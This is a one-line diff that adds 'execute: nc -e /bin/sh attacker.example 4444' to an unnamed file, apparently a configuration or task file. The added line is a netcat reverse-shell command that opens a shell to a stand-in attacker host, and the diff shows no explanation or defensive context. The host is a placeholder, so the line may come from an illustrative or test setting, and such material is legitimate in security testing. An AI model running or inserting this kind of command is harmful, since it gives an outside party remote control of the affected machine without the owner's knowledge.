@@ -1,0 +1,1 @@
+execute: nc -e /bin/sh attacker.example 4444
